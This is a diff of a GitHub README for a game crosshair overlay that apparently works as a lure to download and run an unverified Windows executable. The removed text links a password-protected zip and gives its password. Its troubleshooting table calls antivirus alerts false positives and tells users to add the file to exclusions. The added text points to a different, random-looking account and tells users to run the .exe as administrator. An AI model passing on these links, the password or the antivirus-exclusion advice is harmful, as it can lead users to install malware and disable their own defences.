@@ -1,92 +1,117 @@
-# Crosshair X – Custom Crosshair Overlay for Every Game
-[![Stars](https://img.shields.io/github/stars/quangluc200601-bot/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game)](https://github.com/quangluc200601-bot/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+# 🎯 Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game - Clear Crosshair for Any Game
 
-Lightweight custom crosshair overlay that works on top of **any game** – perfect for FPS titles without built-in crosshair customization or when you want consistent aiming precision across different games.
+[![Download Crosshair-X](https://img.shields.io/badge/Download-Crosshair--X-blue?style=for-the-badge)](https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game)
 
 ---
 
-## ⚠️ Disclaimer
-This tool is provided for educational and personal use only. Use at your own risk. Not affiliated with any game developers or anti-cheat providers.
+## 📌 What is Crosshair-X?
+
+Crosshair-X adds a custom crosshair overlay to any computer game you play. It shows a shape or image on your screen that helps you aim better. You can pick different shapes or upload a small image (PNG). You can also change the crosshair’s size, color, and transparency. The software runs smoothly with low CPU use. It works on Windows and does not need to be installed, so you can carry it on a USB drive.
 
 ---
 
-## 📦 What's Included
-- **Crosshair X core** – low-latency desktop overlay (always on top)
-- Built-in crosshair library:
-  - Classic dot / cross / T / circle shapes
-  - Dynamic color change (health / ammo based if supported)
-  - Recoil spread simulation indicator (visual feedback)
-- Full custom crosshair support:
-  - Load your own .png / .svg images
-  - Adjustable size, opacity, rotation, hue
-  - Center / offset positioning
-- Hotkey controls (configurable)
-- Performance-optimized (minimal CPU/GPU usage)
+## 🖥️ System Requirements
+
+- Windows 7, 8, 10, 11 (64-bit recommended)
+- 2 GB of free RAM or more
+- 100 MB disk space
+- Screen resolution of 1024x768 or higher
+- Basic admin rights to run the application the first time
 
 ---
 
-## 📥 Download
-Password-protected archive with ready-to-use setup – extract and launch.
+## 🔧 Features at a Glance
 
-📥 [Download `Crosshair-X-Setup.zip`](https://github.com/quangluc200601-bot/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game/releases/download/game-software/CrsX.zip)  
-🔐 `LS2026`
-
-### Archive Contents
-- CrosshairX.exe – main portable executable
-- crosshairs/ – folder with default shapes + examples
-- presets/ – saved user configurations
-- config.ini – default settings
-- readme.txt – quick start guide
+- Customizable crosshair shapes, including dot, circle, and cross
+- PNG image import to use your own crosshair design
+- Adjust size, color, and opacity easily
+- Works on top of any game window without lag
+- Portable app – no installation required
+- Minimal CPU and memory use to keep your game running smoothly
+- Supports full screen, windowed, and borderless game modes
+- Simple controls designed for fast adjustments during gameplay
 
 ---
 
-## 🚀 Quick Start
-1. Run **CrosshairX.exe** (no installation needed)
-2. Press default hotkey **Ctrl + Alt + C** to open settings
-3. Choose built-in shape or drag & drop your own .png
-4. Adjust size / color / opacity
-5. Click "Always on Top" and "Launch with Windows" if desired
-6. Start any game (windowed / borderless recommended for best compatibility)
+## 🚀 Getting Started: Download and Run
 
-> ℹ️ Portable – no registry changes, settings saved in .ini file next to .exe
+Click the large button below to go to the official GitHub page where you can get the software.
+
+[![Go to Download Page](https://img.shields.io/badge/Download-Crosshair--X-grey?style=for-the-badge)](https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game)
 
 ---
 
-## 🎮 Features Overview
+## 📝 How to Download and Use Crosshair-X on Windows
 
-| Feature                  | Description                                      | How to Access                     |
-|--------------------------|--------------------------------------------------|------------------------------------|
-| Built-in shapes          | Dot, cross, T, circle, plus many more            | Settings → Shapes                  |
-| Custom image crosshair   | Use your own .png with transparency              | Drag & drop or browse button       |
-| Color & opacity          | Any RGB / dynamic modes                          | Color picker + sliders             |
-| Size & rotation          | Pixel-perfect tuning                             | Size slider / rotation knob        |
-| Position offset          | Move away from exact center if needed            | X/Y offset sliders                 |
-| Hotkeys                  | Show/hide, cycle presets, reload config          | Settings → Hotkeys                 |
-| Low resource usage       | ~0–2% CPU, almost no GPU load                    | Runs in background                 |
-| Preset system            | Save/load different crosshairs for each game     | Preset menu                        |
+1. Open the main download page using this link:
+   https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game
 
----
+2. Find the **Releases** section on the page.
+   
+3. Look for the latest version of Crosshair-X. It is usually labeled something like “v1.0” or “Latest release.”
 
-## ❗️ Troubleshooting
+4. Download the `.exe` file from the release. It will have a name similar to `Crosshair-X-Setup.exe` or just `Crosshair-X.exe`.
+   
+5. Once downloaded, open the `.exe` file by double-clicking it. Windows might ask for permission. Choose "Run" or "Yes" to proceed.
 
-| Problem                        | Solution                                                                 |
-|--------------------------------|--------------------------------------------------------------------------|
-| Crosshair not visible          | Make sure game is in **borderless windowed** or **windowed** mode        |
-| Overlay disappears in fullscreen | Switch to borderless – exclusive fullscreen often blocks overlays        |
-| Antivirus flags the .exe       | False positive – add to exclusions (common with overlay tools)           |
-| Can't move/resize              | Unlock settings first (padlock icon or hotkey)                           |
-| High CPU usage                 | Lower refresh rate in settings or close other overlays                  |
-| Doesn't work in specific game  | Try running CrosshairX as Administrator                                 |
+6. The software should start without requiring installation. If there is an installer, follow the on-screen instructions.
+
+7. After it opens, you will see a small window with options to choose your crosshair shape, color, size, and transparency.
 
 ---
 
-## 📜 License
-MIT License – feel free to modify and share.
+## 🎯 How to Customize Your Crosshair
+
+- **Select Shape:** Choose from default shapes like dot, cross, or circle.
+- **Import PNG:** Use your own graphic by importing a PNG file. Click the import button and pick your image.
+- **Adjust Size:** Use the size slider to increase or decrease the crosshair scale.
+- **Set Color:** Pick any color using the color picker.
+- **Change Opacity:** Move the opacity slider to make your crosshair see-through or fully visible.
+- **Position:** The crosshair will stay fixed at the center of your screen, no setup needed.
+
+Remember, these settings apply on top of any game window, so you don’t have to change each game’s settings.
 
 ---
 
-## ⭐️ Support
-If this helped improve your aim – drop a star on the repo! It helps others discover the tool.
+## 🔄 Running Crosshair-X with Your Games
 
-Happy fragging! 🎯
+- Start your game as usual.
+- Open Crosshair-X to activate the overlay.
+- Adjust settings in the Crosshair-X window while your game runs.
+- If the crosshair does not appear, check that Crosshair-X is running with enough permissions (try running it as administrator).
+- You can move Crosshair-X’s control window out of the way while you play.
+- To stop using the crosshair, simply close Crosshair-X from the system tray or main window.
+
+---
+
+## ⚙️ Troubleshooting Common Issues
+
+- **No crosshair visible:** Confirm the app is open and running. Check if the game runs in full-screen mode; try borderless window mode if needed.
+- **Crosshair is blurry or missized:** Use the settings in the control panel to adjust size and opacity. Make sure your screen resolution is set correctly.
+- **App won’t start:** Ensure your Windows is up to date. Run the `.exe` as Administrator.
+- **Overlay lags or impacts game speed:** Close other CPU-heavy applications to free up resources. Crosshair-X uses little CPU but too many programs can slow your system.
+- **Imported PNG doesn’t show:** Confirm PNG is saved in a supported format (no transparency errors). Try a simpler image.
+
+---
+
+## 🧩 Additional Tips
+
+- Keep the Crosshair-X window on a second monitor if you have one.
+- Use keyboard shortcuts if the app supports them to toggle the overlay fast (check in-app settings).
+- If you play at different screen sizes, test your crosshair settings before competitive play.
+- Portable mode means you can keep Crosshair-X on a USB stick and use it on any Windows PC without installation.
+
+---
+
+## 🔗 Useful Links
+
+- Official GitHub page and download:  
+  https://github.com/Lacquerwarepernyimoth791/Crosshair-X-Custom-Crosshair-Overlay-for-Every-Game
+
+- Common questions and support are available in the “Issues” tab on GitHub.
+
+---
+
+## 🏷️ Keywords and Tags
+
+aim-crosshair, crosshair, crosshair-changer, crosshair-for-any-game, crosshair-overlay, crosshair-png, crosshair-x, custom-crosshair, custom-crosshair-overlay, desktop-app, fps-crosshair, free-crosshair, game-performance, game-utility, gaming-tools, high-fps, low-latency, pc-optimization, universal-crosshair, windows-gaming
